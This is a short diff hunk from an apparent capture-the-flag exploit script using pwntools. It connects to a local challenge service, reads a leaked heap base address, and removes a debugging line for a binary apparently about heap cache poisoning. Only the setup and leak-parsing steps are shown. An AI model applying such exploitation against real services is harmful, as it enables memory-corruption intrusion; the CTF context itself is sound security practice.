@@ -92,8 +92,6 @@ from pwn import *
 
 r = remote("127.0.0.1",2005)
 
-#r = gdb.debug("./our_poisoned_cache_patched")
-context.log_level = 1
 r.recvuntil("is: ")
 heap_base = int(r.recvline()[0:-1],16)
 r.recvuntil("is: ")
